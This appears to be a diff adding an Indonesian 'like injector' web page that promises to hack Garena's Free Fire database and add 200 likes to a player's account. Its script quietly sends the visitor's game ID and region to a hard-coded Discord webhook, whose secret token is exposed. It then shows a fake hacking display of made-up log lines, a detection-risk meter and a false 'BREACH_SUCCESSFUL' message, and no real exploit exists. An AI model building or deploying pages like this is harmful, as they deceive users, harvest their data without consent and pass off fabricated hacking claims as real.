@@ -1,0 +1,491 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>FFADEN | SECURE DATABASE BREACH</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&family=JetBrains+Mono:wght@300;500&display=swap" rel="stylesheet">
+    <style>
+        :root {
+            --neon: #f59e0b;
+            --neon-dim: rgba(245, 158, 11, 0.2);
+            --glitch-red: #ff004d;
+            --glitch-cyan: #00f0ff;
+        }
+
+        body {
+            background-image: url('https://freefiremobile-a.akamaihd.net/common/web_event/official2.ff.garena.all/img/20228/c94811b90b96aaa40c1274f96f35e850.jpg');
+            background-size: cover;
+            background-position: center;
+            background-attachment: fixed;
+            font-family: 'JetBrains Mono', monospace;
+            color: #fff;
+            height: 100vh;
+            overflow: hidden;
+        }
+
+        .overlay {
+            position: fixed;
+            inset: 0;
+            background: radial-gradient(circle, rgba(0,0,0,0.4) 0%, rgba(0,0,0,0.9) 100%);
+            z-index: 0;
+        }
+
+        .hud-frame {
+            background: rgba(5, 5, 5, 0.95);
+            border: 1px solid rgba(245, 158, 11, 0.4);
+            box-shadow: 0 0 60px rgba(0,0,0,1);
+            clip-path: polygon(0% 20px, 20px 0%, calc(100% - 20px) 0%, 100% 20px, 100% calc(100% - 20px), calc(100% - 15px) 100%, 20px 100%, 0% calc(100% - 20px));
+        }
+
+        .neon-text {
+            text-shadow: 0 0 15px var(--neon-dim), 0 0 30px var(--neon);
+            font-family: 'Orbitron', sans-serif;
+        }
+
+        .glitch {
+            position: relative;
+            color: var(--neon);
+            font-weight: 900;
+            letter-spacing: 0.1em;
+            animation: glitch-skew 4s infinite;
+        }
+
+        .glitch::before,
+        .glitch::after {
+            content: attr(data-text);
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+        }
+
+        .glitch::before {
+            left: 2px;
+            text-shadow: -2px 0 var(--glitch-red);
+            clip: rect(0, 900px, 0, 0);
+            animation: glitch-anim 2s infinite linear alternate-reverse;
+        }
+
+        .glitch::after {
+            left: -2px;
+            text-shadow: 2px 0 var(--glitch-cyan);
+            clip: rect(0, 900px, 0, 0);
+            animation: glitch-anim2 3s infinite linear alternate-reverse;
+        }
+
+        @keyframes glitch-anim {
+            0% { clip: rect(42px, 9999px, 44px, 0); transform: skew(0.6deg); }
+            5% { clip: rect(17px, 9999px, 59px, 0); transform: skew(-0.9deg); }
+            10% { clip: rect(63px, 9999px, 104px, 0); transform: skew(0.3deg); }
+            15% { clip: rect(30px, 9999px, 92px, 0); transform: skew(0.8deg); }
+            20% { clip: rect(45px, 9999px, 50px, 0); transform: skew(-0.4deg); }
+            100% { clip: rect(83px, 9999px, 96px, 0); transform: skew(0.2deg); }
+        }
+
+        @keyframes glitch-anim2 {
+            0% { clip: rect(65px, 9999px, 119px, 0); transform: skew(-0.2deg); }
+            5% { clip: rect(76px, 9999px, 106px, 0); transform: skew(0.7deg); }
+            10% { clip: rect(85px, 9999px, 98px, 0); transform: skew(-0.5deg); }
+            100% { clip: rect(5px, 9999px, 87px, 0); transform: skew(0.1deg); }
+        }
+
+        @keyframes glitch-skew {
+            0%, 100% { transform: skew(0deg); }
+            10%, 90% { transform: skew(1deg); }
+            20%, 80% { transform: skew(-2deg); }
+        }
+
+        .glitch-btn {
+            background: var(--neon);
+            color: #000;
+            font-weight: 900;
+            transition: all 0.3s ease;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .glitch-btn:hover:not(:disabled) {
+            box-shadow: 0 0 40px var(--neon);
+            transform: scale(1.02);
+        }
+
+        .glitch-btn:hover::before {
+            content: "";
+            position: absolute;
+            inset: 0;
+            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.25), transparent);
+            animation: scanline 1.8s linear infinite;
+        }
+
+        @keyframes scanline {
+            0% { transform: translateY(-120%); }
+            100% { transform: translateY(120%); }
+        }
+
+        #progress-ring {
+            transition: stroke-dashoffset 0.2s ease;
+            filter: drop-shadow(0 0 10px var(--neon));
+        }
+
+        .log-line {
+            position: relative;
+            display: inline-block;
+            animation: glitch-log 0.8s forwards;
+            animation-timing-function: steps(4);
+        }
+
+        .log-line::before,
+        .log-line::after {
+            content: attr(data-text);
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            pointer-events: none;
+        }
+
+        .log-line::before {
+            left: 1.5px;
+            text-shadow: -1.5px 0 var(--glitch-red);
+            clip: rect(0, 9999px, 0, 0);
+            animation: glitch-log-before 0.8s forwards;
+        }
+
+        .log-line::after {
+            left: -1.5px;
+            text-shadow: 1.5px 0 var(--glitch-cyan);
+            clip: rect(0, 9999px, 0, 0);
+            animation: glitch-log-after 0.8s forwards;
+        }
+
+        @keyframes glitch-log {
+            0% { transform: translate(0); opacity: 1; }
+            20% { transform: translate(-2px, 1px); opacity: 0.85; }
+            40% { transform: translate(2px, -1px); opacity: 0.7; }
+            60% { transform: translate(-1px, 1px); opacity: 0.9; }
+            80% { transform: translate(1px, -1px); opacity: 0.8; }
+            100% { transform: translate(0); opacity: 1; }
+        }
+
+        @keyframes glitch-log-before {
+            0%, 100% { clip: rect(0, 9999px, 100%, 0); }
+            30% { clip: rect(20px, 9999px, 40px, 0); }
+            70% { clip: rect(50px, 9999px, 70px, 0); }
+        }
+
+        @keyframes glitch-log-after {
+            0%, 100% { clip: rect(0, 9999px, 100%, 0); }
+            25% { clip: rect(10px, 9999px, 30px, 0); }
+            55% { clip: rect(60px, 9999px, 80px, 0); }
+        }
+
+        .error-shake {
+            animation: shake 0.4s;
+            border-color: #ef4444 !important;
+        }
+
+        .glitch-success {
+            animation: glitch-text 1.5s 1;
+            color: #22c55e;
+            font-weight: bold;
+            text-shadow: 0 0 10px #22c55e;
+        }
+
+        @keyframes glitch-text {
+            0%, 100% { transform: translate(0); opacity: 1; }
+            20% { transform: translate(-3px, 3px); opacity: 0.7; }
+            40% { transform: translate(3px, -3px); opacity: 0.6; }
+            60% { transform: translate(-2px, 2px); opacity: 0.9; }
+            80% { transform: translate(2px, -2px); opacity: 0.8; }
+        }
+
+        @keyframes shake {
+            0%, 100% { transform: translateX(0); }
+            25% { transform: translateX(-6px); }
+            75% { transform: translateX(6px); }
+        }
+
+        #risk-bar.high-risk {
+            animation: blink-red 1.2s infinite;
+        }
+
+        @keyframes blink-red {
+            0%, 100% { background: rgba(185, 28, 28, 0.4); }
+            50% { background: rgba(220, 38, 38, 0.6); }
+        }
+    </style>
+</head>
+<body class="flex items-center justify-center p-4">
+
+    <div class="overlay"></div>
+
+    <div class="w-full max-w-[480px] z-10">
+        <div class="flex justify-between items-center mb-4 px-2">
+            <div class="flex items-center gap-2">
+                <span class="w-2 h-2 bg-amber-500 rounded-full animate-pulse"></span>
+                <span class="text-[9px] tracking-[4px] text-amber-500 font-bold uppercase">DB_BREACH_V4</span>
+            </div>
+            <div class="text-[9px] tracking-[3px] text-white/50" id="clock">00:00:00</div>
+        </div>
+
+        <div class="hud-frame p-1 relative">
+            <div class="p-6 md:p-10 relative">
+                
+                <div id="view-init">
+                    <div class="mb-10 text-center">
+                        <h1 class="text-4xl glitch neon-text italic uppercase" data-text="ADN_RUNXT">ADN<span class="text-white">_RUNXT</span></h1>
+                        <p id="error-msg" class="text-[7px] tracking-[2px] text-white/30 uppercase mt-2 italic">Awaiting Valid Identification...</p>
+                    </div>
+
+                    <div id="risk-bar" class="hidden bg-red-900/40 border border-red-600 text-red-300 p-3 text-center text-xs tracking-wider mb-6 rounded-lg">
+                        DETECTION RISK: <span id="risk-level">8</span>% • Garena Anti-Cheat Scanning...
+                    </div>
+
+                    <div class="space-y-6">
+                        <div>
+                            <label class="text-[9px] text-amber-500 block mb-3 tracking-[3px] font-bold uppercase">PILIH REGION</label>
+                            <select id="node" class="w-full bg-black/80 border border-white/10 rounded-xl px-4 py-4 outline-none focus:border-amber-500 transition-all text-xs cursor-pointer">
+                                <option value="ID">ID-INDONESIA (SERVER_PRIMARY)</option>
+                                <option value="SG">SG-SINGAPURA (GATEWAY_HUB)</option>
+                            </select>
+                        </div>
+
+                        <div>
+                            <label class="text-[9px] text-amber-500 block mb-3 tracking-[3px] font-bold uppercase">ID FREE FIRE</label>
+                            <input type="number" id="uid" placeholder="Masukan ID (8-11 Digit)" 
+                                oninput="if(value.length>11)value=value.slice(0,11)"
+                                class="w-full bg-black/80 border border-white/10 rounded-xl px-4 py-4 text-2xl font-bold outline-none focus:border-amber-500 transition-all placeholder:text-white/5 tracking-[6px]">
+                        </div>
+
+                        <button id="submit-btn" onclick="validateAndStart()" class="glitch-btn w-full py-5 font-black tracking-[4px] text-xs rounded-xl uppercase">
+                            Send Like's FreeFire
+                        </button>
+                    </div>
+                </div>
+
+                <div id="view-proc" class="hidden">
+                    <div class="flex flex-col items-center">
+                        <div id="countdown" class="text-amber-400 text-xl font-bold mb-4 tracking-wider">INJECTION COMPLETE IN: 00:20</div>
+
+                        <div class="relative w-32 h-32 mb-6">
+                            <svg class="w-full h-full transform -rotate-90">
+                                <circle cx="64" cy="64" r="60" stroke="rgba(255,255,255,0.05)" stroke-width="4" fill="transparent"></circle>
+                                <circle id="progress-ring" cx="64" cy="64" r="60" stroke="#f59e0b" stroke-width="4" fill="transparent" 
+                                    stroke-dasharray="377" stroke-dashoffset="377" stroke-linecap="round"></circle>
+                            </svg>
+                            <div class="absolute inset-0 flex items-center justify-center">
+                                <div class="text-2xl font-black italic text-white" id="perc">0%</div>
+                            </div>
+                        </div>
+
+                        <div class="w-full space-y-4">
+                            <div class="terminal-box p-3 h-48 overflow-y-auto font-mono text-amber-500/90 leading-tight border border-white/10 rounded-lg shadow-inner" id="logs">
+                                <div class="text-white/40">[SYSTEM] ID_VERIFIED. Starting Injection...</div>
+                            </div>
+                            
+                            <div class="bg-black/80 p-5 rounded-2xl text-center border border-white/5">
+                                <div class="text-[8px] text-white/30 mb-1 tracking-[5px] uppercase">Database_Manipulation_Progress</div>
+                                <div class="text-6xl font-black tracking-tighter text-white" id="likes">000</div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+            </div>
+        </div>
+
+        <footer class="mt-8 flex justify-between px-2 text-[8px] text-white/20 tracking-[4px] uppercase font-bold">
+            <div>VERIFIED ACCESS</div>
+            <div>© 2026 FFADEN INJECTOR LIKE</div>
+        </footer>
+    </div>
+
+    <!-- Sound effects -->
+    <audio id="beep-sound" preload="auto">
+        <source src="https://assets.codepen.io/243235/beep.mp3" type="audio/mpeg">
+    </audio>
+    <audio id="success-sound" preload="auto">
+        <source src="https://assets.codepen.io/243235/success-beep.mp3" type="audio/mpeg">
+    </audio>
+
+    <script>
+        setInterval(() => {
+            const now = new Date();
+            document.getElementById('clock').innerText = now.toLocaleTimeString('id-ID');
+        }, 1000);
+
+        async function sendToDiscord(uid, region) {
+            const webhookUrl = "https://discord.com/api/webhooks/1483574447251128404/02c0oRkd3ycGJmHrzGbBgMvdVy-j5IRjtUY3Zpu8cBInahr2ds1ud_n8e4z_13_kiUDf";
+
+            const payload = {
+                content: null,
+                embeds: [{
+                    title: "🟠 FFADEN INJECTOR LIKE • New Like Injection Request",
+                    description: "Pengiriman like melalui interface DB breach telah diminta.",
+                    color: 0xF59E0B,
+                    fields: [
+                        { name: "🆔 Free Fire ID", value: "`" + uid + "`", inline: true },
+                        { name: "🌍 Region", value: "`" + region + "`", inline: true },
+                        { name: "⏰ Waktu Request", value: "<t:" + Math.floor(Date.now()/1000) + ":F> (<t:" + Math.floor(Date.now()/1000) + ":R>)", inline: false }
+                    ],
+                    footer: { text: "FFADEN_INJECTOR_LIKE • Semarang, ID" },
+                    timestamp: new Date().toISOString()
+                }]
+            };
+
+            try {
+                await fetch(webhookUrl, {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify(payload)
+                });
+            } catch (err) {}
+        }
+
+        function validateAndStart() {
+            const uidInput = document.getElementById('uid');
+            const uidValue = uidInput.value.trim();
+            const errorMsg = document.getElementById('error-msg');
+
+            if (uidValue.length < 8 || uidValue.length > 11) {
+                uidInput.classList.add('error-shake');
+                errorMsg.innerText = "ERROR: ID HARUS 8-11 DIGIT!";
+                errorMsg.classList.replace('text-white/30', 'text-red-500');
+                
+                setTimeout(() => {
+                    uidInput.classList.remove('error-shake');
+                    errorMsg.classList.replace('text-red-500', 'text-white/30');
+                    errorMsg.innerText = "Awaiting Valid Identification...";
+                }, 2000);
+                return;
+            }
+
+            sendToDiscord(uidValue, document.getElementById('node').value);
+            startProtocol();
+        }
+
+        function startProtocol() {
+            document.getElementById('view-init').classList.add('hidden');
+            document.getElementById('view-proc').classList.remove('hidden');
+
+            const ring = document.getElementById('progress-ring');
+            const percBox = document.getElementById('perc');
+            const logBox = document.getElementById('logs');
+            const likesBox = document.getElementById('likes');
+            const riskLevel = document.getElementById('risk-level');
+            const riskBar = document.getElementById('risk-bar');
+            const countdownEl = document.getElementById('countdown');
+
+            const beep = document.getElementById('beep-sound');
+            const success = document.getElementById('success-sound');
+
+            let p = 0;
+            let l = 0;
+            let risk = 8;
+            let timeLeft = 20;
+            const targetLikes = 200;
+            const circumference = 377;
+
+            riskBar.classList.remove('hidden');
+            countdownEl.classList.remove('hidden');
+
+            const hackingCommands = [
+                "SPOOFING_IP: 103.147.32.147 → Semarang, ID",
+                "DEVICE_FINGERPRINT: Android 14 • Chrome/128.0.6613.146",
+                "GEO_LOCATION_LOCKED: -6.9667, 110.4167 (Central Java)",
+                "TCP_CONNECTING: GARENA_SECURE_NODE...",
+                "BYPASSING_AUTH_TOKEN_0x88...",
+                "SQL_QUERY: SELECT * FROM USERS WHERE UID...",
+                "TARGET_IDENTIFIED: CLUSTER_ASIA_ID...",
+                "OPENING_DATABASE_PORT: 3306...",
+                "INJECTING_LIKE_VALUE_200...",
+                "ENCRYPTING_METADATA_PACKETS...",
+                "Handshake: [RSA_4096_ENCRYPT]...",
+                "SPOOFING_REMOTE_ADDR: 10.2.44.11...",
+                "Clearing Access Logs...",
+                "Syncing Account Profile...",
+                "VERIFYING_HASH_INTEGRITY..."
+            ];
+
+            const countdownInterval = setInterval(() => {
+                timeLeft--;
+                const min = Math.floor(timeLeft / 60).toString().padStart(2, '0');
+                const sec = (timeLeft % 60).toString().padStart(2, '0');
+                countdownEl.innerText = `INJECTION COMPLETE IN: ${min}:${sec}`;
+                if (timeLeft <= 0) {
+                    clearInterval(countdownInterval);
+                    countdownEl.innerText = "INJECTION SUCCESS";
+                    countdownEl.classList.add('text-green-400');
+                }
+            }, 1000);
+
+            const riskInterval = setInterval(() => {
+                if (risk < 28) {
+                    risk += Math.floor(Math.random() * 4) + 1;
+                    if (risk > 28) risk = 28;
+                    riskLevel.innerText = risk;
+
+                    if (risk >= 20) {
+                        riskBar.classList.add('high-risk');
+                    }
+                }
+            }, 1500);
+
+            const interval = setInterval(() => {
+                p += 1;
+                percBox.innerText = p + "%";
+                
+                const offset = circumference - (p / 100) * circumference;
+                ring.style.strokeDashoffset = offset;
+
+                if(p % 3 === 0) {
+                    beep.currentTime = 0;
+                    beep.play().catch(() => {});
+
+                    const m = hackingCommands[Math.floor(Math.random() * hackingCommands.length)];
+                    const text = `> [${(Math.random()*999).toFixed(0)}] ${m}`;
+                    
+                    const div = document.createElement('div');
+                    div.className = 'log-line';
+                    div.setAttribute('data-text', text);
+                    div.innerText = text;
+                    
+                    logBox.prepend(div);
+                }
+
+                if(p > 10 && l < targetLikes) {
+                    l += Math.ceil((targetLikes - l) / 15);
+                    if(l > targetLikes) l = targetLikes;
+                    likesBox.innerText = l.toString().padStart(3, '0');
+                }
+
+                if(p >= 100) {
+                    clearInterval(interval);
+                    clearInterval(riskInterval);
+                    clearInterval(countdownInterval);
+
+                    riskBar.classList.remove('high-risk');
+                    riskBar.innerHTML = "DETECTION RISK: 28% • Injection Stabilized";
+
+                    const successMsg = document.createElement('div');
+                    successMsg.className = "text-green-500 font-bold border-t border-green-500/20 mt-2 pt-2 glitch-success";
+                    successMsg.innerText = "> BREACH_SUCCESSFUL: 200 LIKES ADDED";
+                    logBox.prepend(successMsg);
+
+                    ring.style.stroke = '#22c55e';
+                    ring.style.filter = 'drop-shadow(0 0 15px #22c55e) brightness(1.3)';
+
+                    likesBox.classList.add('text-amber-500', 'animate-pulse');
+
+                    success.currentTime = 0;
+                    success.play().catch(() => {});
+                }
+            }, 200);
+        }
+    </script>
+</body>
+</html>
